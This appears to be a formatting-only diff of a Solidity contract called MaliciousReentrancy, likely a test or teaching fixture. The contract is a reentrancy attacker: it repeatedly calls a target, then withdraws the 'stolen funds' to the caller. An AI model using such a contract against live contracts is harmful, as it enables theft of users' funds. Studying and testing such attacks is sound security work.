@@ -10,18 +10,17 @@ contract MaliciousReentrancy {
         target = payable(_target); // Convert internally
     }
 
-
     // Fallback function to execute reentrancy
     fallback() external payable {
         if (address(target).balance >= attackValue) {
             // Re-enter the target contract
-            (bool success, ) = target.call{value: attackValue}("");
+            (bool success,) = target.call{ value: attackValue }("");
             require(success, "Reentrancy failed");
         }
     }
 
     // Receive function to handle direct Ether transfers
-    receive() external payable {}
+    receive() external payable { }
 
     // Attack initiation function
     function initiateAttack(uint256 _attackValue) external payable {
@@ -29,13 +28,13 @@ contract MaliciousReentrancy {
         attackValue = _attackValue;
 
         // Initial call to the target contract
-        (bool success, ) = target.call{value: _attackValue}("");
+        (bool success,) = target.call{ value: _attackValue }("");
         require(success, "Initial attack failed");
     }
 
     // Withdraw stolen funds
     function withdraw() external {
-        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
+        (bool success,) = payable(msg.sender).call{ value: address(this).balance }("");
         require(success, "Withdraw failed");
     }
 }
